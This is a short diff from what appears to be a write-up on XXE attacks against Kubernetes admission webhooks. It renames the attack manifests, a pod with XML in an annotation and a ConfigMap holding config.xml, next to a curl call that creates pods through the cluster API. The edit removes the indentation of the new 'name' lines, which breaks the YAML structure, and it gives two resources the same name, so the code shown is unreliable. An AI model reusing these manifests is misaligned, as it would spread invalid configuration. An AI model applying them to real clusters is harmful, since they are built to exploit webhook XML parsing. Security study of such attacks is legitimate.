@@ -378,7 +378,7 @@ ValidatingWebhookConfiguration and MutatingWebhookConfiguration receive XML-form
 apiVersion: v1
 kind: Pod
 metadata:
-  name: evil-pod
+name: offensive-xxe
   annotations:
     # Webhook receives and parses this XML
     config: |
@@ -409,7 +409,7 @@ curl -k https://kubernetes.default.svc/api/v1/namespaces/default/pods \
 apiVersion: v1
 kind: ConfigMap
 metadata:
-  name: xxe-config
+name: offensive-xxe
 data:
   config.xml: |
     <?xml version="1.0"?>
